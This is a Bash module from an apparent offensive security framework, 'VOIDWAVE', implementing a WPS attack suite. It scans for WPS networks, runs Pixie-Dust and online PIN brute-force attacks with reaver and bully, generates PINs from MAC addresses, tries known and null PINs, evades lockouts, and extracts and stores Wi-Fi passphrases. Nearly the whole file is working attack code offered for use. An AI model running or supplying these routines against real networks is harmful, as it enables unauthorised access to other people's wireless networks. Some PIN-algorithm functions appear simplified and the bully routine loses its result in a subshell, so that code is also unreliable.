#!/usr/bin/env bash
# ═══════════════════════════════════════════════════════════════════════════════
# VOIDWAVE - Offensive Security Framework
# ═══════════════════════════════════════════════════════════════════════════════
# Copyright (c) 2025 Nerds489
# SPDX-License-Identifier: Apache-2.0
#
# WPS Attack Suite: 11 WPS attack methods, PIN algorithms, lockout handling
# ═══════════════════════════════════════════════════════════════════════════════

# Prevent multiple sourcing
[[ -n "${_VOIDWAVE_ATTACKS_WPS_LOADED:-}" ]] && return 0
readonly _VOIDWAVE_ATTACKS_WPS_LOADED=1

# Source core if not loaded
if ! declare -F log_info &>/dev/null; then
    source "${BASH_SOURCE%/*}/../core.sh"
fi

# Source wireless modules
source "${BASH_SOURCE%/*}/../wireless/config.sh" 2>/dev/null || true
source "${BASH_SOURCE%/*}/../wireless/loot.sh" 2>/dev/null || true
source "${BASH_SOURCE%/*}/../wireless/session.sh" 2>/dev/null || true

#═══════════════════════════════════════════════════════════════════════════════
# WPS STATE TRACKING
#═══════════════════════════════════════════════════════════════════════════════

# WPS attack state
declare -gA WPS_STATE=(
    [bssid]=""
    [essid]=""
    [channel]=""
    [pin]=""
    [psk]=""
    [locked]="false"
    [lock_time]="0"
    [pins_tried]="0"
    [last_error]=""
)

# Known PINs database path
declare -g WPS_PINS_DB="${VOIDWAVE_ROOT:-/opt/voidwave}/data/wps_pins.db"

#═══════════════════════════════════════════════════════════════════════════════
# WPS SCANNING
#═══════════════════════════════════════════════════════════════════════════════

# Scan for WPS-enabled networks
# Args: $1 = interface (monitor mode), $2 = duration (optional)
# Returns: list of WPS networks
wps_scan() {
    local iface="$1"
    local duration="${2:-30}"

    if ! command -v wash &>/dev/null; then
        log_error "wash not found (install reaver package)"
        return 1
    fi

    log_info "Scanning for WPS networks on $iface (${duration}s)..."
    log_command_preview "wash -i $iface -5"

    local output
    output="${WIRELESS_LOOT_SCANS:-/tmp}/wps_scan_$(date +%Y%m%d_%H%M%S).txt"

    # Run wash with timeout
    timeout "$duration" wash -i "$iface" -5 2>/dev/null | tee "$output"

    log_loot "WPS scan saved: $output"
}

# Scan WPS with verbose output
# Args: $1 = interface
wps_scan_verbose() {
    local iface="$1"

    if ! command -v wash &>/dev/null; then
        log_error "wash not found"
        return 1
    fi

    log_info "Verbose WPS scan on $iface..."
    log_command_preview "wash -i $iface -5 -j"

    # JSON output for parsing
    wash -i "$iface" -5 -j 2>/dev/null
}

# Check WPS lock status for a target
# Args: $1 = interface, $2 = bssid, $3 = channel
# Returns: 0 if unlocked, 1 if locked
wps_check_lock_status() {
    local iface="$1"
    local bssid="$2"
    local channel="$3"

    if ! command -v wash &>/dev/null; then
        log_warning "Cannot check WPS lock without wash"
        return 0  # Assume unlocked
    fi

    log_info "Checking WPS lock status for $bssid..."

    # Quick wash scan
    local status
    status=$(timeout 10 wash -i "$iface" -c "$channel" 2>/dev/null | grep -i "$bssid")

    if echo "$status" | grep -qi "locked\|lck\|yes"; then
        log_warning "WPS is LOCKED on $bssid"
        WPS_STATE[locked]="true"
        WPS_STATE[lock_time]=$(date +%s)
        return 1
    else
        log_success "WPS is UNLOCKED on $bssid"
        WPS_STATE[locked]="false"
        return 0
    fi
}

#═══════════════════════════════════════════════════════════════════════════════
# PIXIE-DUST ATTACKS (OFFLINE)
#═══════════════════════════════════════════════════════════════════════════════

# Pixie-Dust attack using Reaver
# Args: $1 = interface, $2 = bssid, $3 = channel
wps_pixie_reaver() {
    local iface="$1"
    local bssid="$2"
    local channel="$3"

    if ! command -v reaver &>/dev/null; then
        log_error "reaver not found"
        return 1
    fi

    if ! command -v pixiewps &>/dev/null; then
        log_error "pixiewps not found (required for Pixie-Dust)"
        return 1
    fi

    WPS_STATE[bssid]="$bssid"
    WPS_STATE[channel]="$channel"

    log_info "Starting Pixie-Dust attack on $bssid (Reaver)"
    log_command_preview "reaver -i $iface -b $bssid -c $channel -K 1 -vvv"

    wireless_attack_start "wps_pixie_reaver"

    local output
    output=$(reaver -i "$iface" -b "$bssid" -c "$channel" -K 1 -vvv 2>&1 | tee /dev/stderr)

    # Check for PIN in output
    local pin
    pin=$(echo "$output" | sed -n "s/.*WPS PIN:[[:space:]]*'\\([0-9]*\\).*/\\1/p")

    if [[ -n "$pin" ]]; then
        WPS_STATE[pin]="$pin"
        log_success "PIN found: $pin"

        # Get PSK if available
        local psk
        psk=$(echo "$output" | sed -n "s/.*WPA PSK:[[:space:]]*'\\([^']*\\).*/\\1/p")
        [[ -n "$psk" ]] && WPS_STATE[psk]="$psk"

        wireless_attack_wps_pin_found "$pin"
        wireless_loot_save_wps "${WPS_STATE[essid]:-unknown}" "$bssid" "$pin" "$psk"

        wireless_attack_success "PIN: $pin"
        return 0
    else
        wireless_attack_fail "No PIN found"
        return 1
    fi
}

# Pixie-Dust attack using Bully
# Args: $1 = interface, $2 = bssid, $3 = channel
wps_pixie_bully() {
    local iface="$1"
    local bssid="$2"
    local channel="$3"

    if ! command -v bully &>/dev/null; then
        log_error "bully not found"
        return 1
    fi

    if ! command -v pixiewps &>/dev/null; then
        log_error "pixiewps not found"
        return 1
    fi

    WPS_STATE[bssid]="$bssid"
    WPS_STATE[channel]="$channel"

    log_info "Starting Pixie-Dust attack on $bssid (Bully)"
    log_command_preview "bully -b $bssid -c $channel -d $iface"

    wireless_attack_start "wps_pixie_bully"

    local output
    output=$(bully -b "$bssid" -c "$channel" -d "$iface" 2>&1 | tee /dev/stderr)

    # Parse output for PIN
    local pin
    pin=$(echo "$output" | sed -n 's/.*Pin found:[[:space:]]*\([0-9]*\).*/\1/p')

    if [[ -n "$pin" ]]; then
        WPS_STATE[pin]="$pin"
        wireless_attack_wps_pin_found "$pin"

        local psk
        psk=$(echo "$output" | sed -n 's/.*Pass:[[:space:]]*\(.*\)/\1/p')
        [[ -n "$psk" ]] && WPS_STATE[psk]="$psk"

        wireless_loot_save_wps "${WPS_STATE[essid]:-unknown}" "$bssid" "$pin" "$psk"
        wireless_attack_success "PIN: $pin"
        return 0
    else
        wireless_attack_fail "No PIN found"
        return 1
    fi
}

# Auto Pixie-Dust (try Reaver, fallback to Bully)
# Args: $1 = interface, $2 = bssid, $3 = channel
wps_pixie_auto() {
    local iface="$1"
    local bssid="$2"
    local channel="$3"

    log_info "Auto Pixie-Dust attack on $bssid"

    # Try Reaver first
    if command -v reaver &>/dev/null; then
        log_info "Trying Reaver..."
        if wps_pixie_reaver "$iface" "$bssid" "$channel"; then
            return 0
        fi
    fi

    # Fallback to Bully
    if command -v bully &>/dev/null; then
        log_info "Trying Bully..."
        if wps_pixie_bully "$iface" "$bssid" "$channel"; then
            return 0
        fi
    fi

    log_error "Pixie-Dust attack failed with all tools"
    return 1
}

#═══════════════════════════════════════════════════════════════════════════════
# PIN BRUTE-FORCE ATTACKS (ONLINE)
#═══════════════════════════════════════════════════════════════════════════════

# Standard Reaver PIN attack
# Args: $1 = interface, $2 = bssid, $3 = channel, $4 = options (optional)
wps_bruteforce_reaver() {
    local iface="$1"
    local bssid="$2"
    local channel="$3"
    local options="${4:-}"

    local timeout
    timeout=$(wireless_config_get "wps_timeout" 2>/dev/null || echo "660")
    local fail_limit
    fail_limit=$(wireless_config_get "wps_fail_limit" 2>/dev/null || echo "100")

    log_info "Starting WPS PIN brute-force on $bssid (Reaver)"
    log_warning "This may take several hours. Use Pixie-Dust first if possible."
    log_command_preview "reaver -i $iface -b $bssid -c $channel -vv -t 5 -d 1 $options"

    wireless_attack_start "wps_bruteforce_reaver" "11000"

    # Run reaver - use process substitution to avoid subshell variable loss
    while IFS= read -r line; do
        echo "$line"

        # Track progress
        if [[ "$line" =~ Trying\ pin\ ([0-9]+) ]]; then
            local pin="${BASH_REMATCH[1]}"
            ((WPS_STATE[pins_tried]++)) || true
            wireless_attack_progress "${WPS_STATE[pins_tried]}"
        fi

        # Check for success
        if [[ "$line" =~ WPS\ PIN:\ \'([0-9]+)\' ]]; then
            WPS_STATE[pin]="${BASH_REMATCH[1]}"
        fi

        if [[ "$line" =~ WPA\ PSK:\ \'([^\']+)\' ]]; then
            WPS_STATE[psk]="${BASH_REMATCH[1]}"
        fi

        # Check for lockout
        if [[ "$line" =~ locked|rate.limit ]]; then
            log_warning "WPS lockout detected"
            WPS_STATE[locked]="true"
        fi
    done < <(reaver -i "$iface" -b "$bssid" -c "$channel" \
        -vv -t 5 -d 1 \
        --fail-wait=360 \
        $options 2>&1)

    if [[ -n "${WPS_STATE[pin]}" ]]; then
        wireless_attack_wps_pin_found "${WPS_STATE[pin]}"
        wireless_loot_save_wps "${WPS_STATE[essid]:-unknown}" "$bssid" "${WPS_STATE[pin]}" "${WPS_STATE[psk]}"
        wireless_attack_success "PIN: ${WPS_STATE[pin]}"
        return 0
    else
        wireless_attack_fail "No PIN found"
        return 1
    fi
}

# Bully PIN attack
# Args: $1 = interface, $2 = bssid, $3 = channel
wps_bruteforce_bully() {
    local iface="$1"
    local bssid="$2"
    local channel="$3"

    log_info "Starting WPS PIN brute-force on $bssid (Bully)"
    log_command_preview "bully -b $bssid -c $channel $iface"

    wireless_attack_start "wps_bruteforce_bully" "11000"

    bully -b "$bssid" -c "$channel" "$iface" 2>&1 | while IFS= read -r line; do
        echo "$line"

        if [[ "$line" =~ Pin\ found:\ ([0-9]+) ]]; then
            WPS_STATE[pin]="${BASH_REMATCH[1]}"
        fi
    done

    if [[ -n "${WPS_STATE[pin]}" ]]; then
        wireless_attack_wps_pin_found "${WPS_STATE[pin]}"
        wireless_attack_success "PIN: ${WPS_STATE[pin]}"
        return 0
    else
        wireless_attack_fail "No PIN found"
        return 1
    fi
}

# Brute-force with delay (to avoid lockout)
# Args: $1 = interface, $2 = bssid, $3 = channel, $4 = delay_seconds
wps_bruteforce_with_delay() {
    local iface="$1"
    local bssid="$2"
    local channel="$3"
    local delay="${4:-60}"

    log_info "WPS brute-force with ${delay}s delay between attempts"

    # Use reaver with delay settings
    wps_bruteforce_reaver "$iface" "$bssid" "$channel" "-l $delay"
}

#═══════════════════════════════════════════════════════════════════════════════
# PIN ALGORITHM ATTACKS
#═══════════════════════════════════════════════════════════════════════════════

# Calculate WPS PIN checksum digit
# Args: $1 = 7-digit PIN (without checksum)
# Returns: checksum digit
wps_pin_checksum() {
    local pin="$1"
    local accum=0
    local i

    # Process 7 digits
    for ((i=0; i<7; i++)); do
        local digit="${pin:$i:1}"
        if (( i % 2 == 0 )); then
            accum=$((accum + digit * 3))
        else
            accum=$((accum + digit))
        fi
    done

    echo $(( (10 - (accum % 10)) % 10 ))
}

# ComputePIN algorithm (from MAC address)
# Args: $1 = MAC address
# Returns: 8-digit PIN
wps_pin_compute() {
    local mac="$1"

    # Remove colons and convert to uppercase
    local mac_clean="${mac//:/}"
    mac_clean="${mac_clean^^}"

    # Take last 6 hex digits (NIC portion)
    local nic="${mac_clean: -6}"

    # Convert to decimal
    local nic_dec=$((16#$nic))

    # ComputePIN calculation
    local pin=$((nic_dec % 10000000))

    # Format with leading zeros
    local pin_str
    pin_str=$(printf "%07d" "$pin")

    # Add checksum
    local checksum
    checksum=$(wps_pin_checksum "$pin_str")

    echo "${pin_str}${checksum}"
}

# EasyBox algorithm
# Args: $1 = MAC address
# Returns: 8-digit PIN
wps_pin_easybox() {
    local mac="$1"
    local mac_clean="${mac//:/}"
    mac_clean="${mac_clean^^}"

    # EasyBox uses different calculation
    local k1=$((16#${mac_clean:0:2}))
    local k2=$((16#${mac_clean:2:2}))
    local k3=$((16#${mac_clean:4:2}))
    local k4=$((16#${mac_clean:6:2}))
    local k5=$((16#${mac_clean:8:2}))
    local k6=$((16#${mac_clean:10:2}))

    local sn=$((k6 ^ k5 ^ k4 ^ k3 ^ k2 ^ k1))
    local x1=$(( (k6 % 10) ^ (k5 % 10) ))
    local x2=$(( (k5 % 10) ^ (k4 % 10) ))
    local x3=$(( (k4 % 10) ^ (k3 % 10) ))
    local x4=$(( (k3 % 10) ^ (k2 % 10) ))
    local x5=$(( (k2 % 10) ^ (k1 % 10) ))
    local x6=$(( (k1 % 10) ^ (k6 % 10) ))
    local x7=$(( sn % 10 ))

    local pin_str="${x1}${x2}${x3}${x4}${x5}${x6}${x7}"
    local checksum
    checksum=$(wps_pin_checksum "$pin_str")

    echo "${pin_str}${checksum}"
}

# Arcadyan algorithm
# Args: $1 = MAC address
# Returns: 8-digit PIN
wps_pin_arcadyan() {
    local mac="$1"
    local mac_clean="${mac//:/}"
    mac_clean="${mac_clean^^}"

    # Arcadyan uses serial number from last 4 hex digits
    local sn=$((16#${mac_clean: -4}))

    # Calculate PIN base
    local pin_base=$((sn * 10))
    local pin_7=$((pin_base % 10000000))

    local pin_str
    pin_str=$(printf "%07d" "$pin_7")

    local checksum
    checksum=$(wps_pin_checksum "$pin_str")

    echo "${pin_str}${checksum}"
}

# Try all algorithm-generated PINs
# Args: $1 = interface, $2 = bssid, $3 = channel
wps_try_algorithm_pins() {
    local iface="$1"
    local bssid="$2"
    local channel="$3"

    log_info "Trying algorithm-generated PINs for $bssid"

    local pins=()
    pins+=("$(wps_pin_compute "$bssid")")
    pins+=("$(wps_pin_easybox "$bssid")")
    pins+=("$(wps_pin_arcadyan "$bssid")")

    for pin in "${pins[@]}"; do
        log_info "Trying PIN: $pin"

        if wps_try_pin "$iface" "$bssid" "$channel" "$pin"; then
            log_success "PIN $pin worked!"
            return 0
        fi
    done

    log_error "No algorithm PINs worked"
    return 1
}

#═══════════════════════════════════════════════════════════════════════════════
# KNOWN PINS DATABASE
#═══════════════════════════════════════════════════════════════════════════════

# Lookup known PINs by MAC prefix
# Args: $1 = MAC address or prefix
# Returns: list of known PINs
wps_known_pins_lookup() {
    local mac="$1"
    local prefix="${mac:0:8}"
    prefix="${prefix//:/}"
    prefix="${prefix^^}"

    if [[ ! -f "$WPS_PINS_DB" ]]; then
        log_warning "WPS PINs database not found: $WPS_PINS_DB"
        return 1
    fi

    # Search for matching prefix
    grep -i "^$prefix" "$WPS_PINS_DB" 2>/dev/null | cut -d'|' -f2
}

# Try all known PINs for a vendor
# Args: $1 = interface, $2 = bssid, $3 = channel
wps_try_known_pins() {
    local iface="$1"
    local bssid="$2"
    local channel="$3"

    local pins
    pins=$(wps_known_pins_lookup "$bssid")

    if [[ -z "$pins" ]]; then
        log_info "No known PINs for this MAC prefix"
        return 1
    fi

    log_info "Found known PINs for $bssid"

    while IFS= read -r pin; do
        [[ -z "$pin" ]] && continue

        log_info "Trying known PIN: $pin"

        if wps_try_pin "$iface" "$bssid" "$channel" "$pin"; then
            log_success "Known PIN $pin worked!"
            return 0
        fi
    done <<< "$pins"

    log_error "No known PINs worked"
    return 1
}

#═══════════════════════════════════════════════════════════════════════════════
# NULL PIN EXPLOIT
#═══════════════════════════════════════════════════════════════════════════════

# Try null/empty PIN exploit
# Args: $1 = interface, $2 = bssid, $3 = channel
wps_null_pin_attack() {
    local iface="$1"
    local bssid="$2"
    local channel="$3"

    log_info "Trying Null PIN exploit on $bssid"

    # Common null PIN variants
    local null_pins=("" "00000000" "12345670" "00000001")

    for pin in "${null_pins[@]}"; do
        log_info "Trying: ${pin:-<empty>}"

        if reaver -i "$iface" -b "$bssid" -c "$channel" \
            -p "${pin:-}" -vv 2>&1 | grep -q "WPA PSK"; then
            log_success "Null PIN exploit successful!"
            return 0
        fi
    done

    log_error "Null PIN exploit failed"
    return 1
}

#═══════════════════════════════════════════════════════════════════════════════
# PIN TESTING UTILITY
#═══════════════════════════════════════════════════════════════════════════════

# Try a specific PIN
# Args: $1 = interface, $2 = bssid, $3 = channel, $4 = pin
wps_try_pin() {
    local iface="$1"
    local bssid="$2"
    local channel="$3"
    local pin="$4"

    log_debug "Testing PIN: $pin"

    local output
    output=$(timeout 30 reaver -i "$iface" -b "$bssid" -c "$channel" \
        -p "$pin" -vv 2>&1)

    if echo "$output" | grep -q "WPA PSK"; then
        WPS_STATE[pin]="$pin"
        local psk
        psk=$(echo "$output" | sed -n "s/.*WPA PSK:[[:space:]]*'\\([^']*\\).*/\\1/p")
        WPS_STATE[psk]="$psk"
        return 0
    fi

    return 1
}

# Get PSK using known PIN
# Args: $1 = interface, $2 = bssid, $3 = channel, $4 = pin
wps_get_psk_from_pin() {
    local iface="$1"
    local bssid="$2"
    local channel="$3"
    local pin="$4"

    log_info "Retrieving PSK using PIN $pin"

    local output
    output=$(reaver -i "$iface" -b "$bssid" -c "$channel" -p "$pin" -vv 2>&1)

    local psk
    psk=$(echo "$output" | sed -n "s/.*WPA PSK:[[:space:]]*'\\([^']*\\).*/\\1/p")

    if [[ -n "$psk" ]]; then
        log_success "PSK: $psk"
        WPS_STATE[psk]="$psk"
        echo "$psk"
        return 0
    else
        log_error "Failed to retrieve PSK"
        return 1
    fi
}

#═══════════════════════════════════════════════════════════════════════════════
# LOCKOUT HANDLING
#═══════════════════════════════════════════════════════════════════════════════

# Check if locked and wait if necessary
# Args: $1 = wait time in seconds (optional)
wps_wait_for_unlock() {
    local wait_time="${1:-60}"

    if [[ "${WPS_STATE[locked]}" != "true" ]]; then
        return 0
    fi

    log_warning "WPS is locked, waiting ${wait_time}s..."
    sleep "$wait_time"
    WPS_STATE[locked]="false"
    log_info "Resuming..."
}

# Detect lockout from reaver output
# Args: $1 = output line
wps_detect_lockout() {
    local line="$1"

    if [[ "$line" =~ locked|rate.limit|waiting|timeout ]]; then
        return 0
    fi

    return 1
}

#═══════════════════════════════════════════════════════════════════════════════
# EXPORTS
#═══════════════════════════════════════════════════════════════════════════════

export -f wps_scan wps_scan_verbose wps_check_lock_status
export -f wps_pixie_reaver wps_pixie_bully wps_pixie_auto
export -f wps_bruteforce_reaver wps_bruteforce_bully wps_bruteforce_with_delay
export -f wps_pin_checksum wps_pin_compute wps_pin_easybox wps_pin_arcadyan
export -f wps_try_algorithm_pins wps_known_pins_lookup wps_try_known_pins
export -f wps_null_pin_attack wps_try_pin wps_get_psk_from_pin
export -f wps_wait_for_unlock wps_detect_lockout
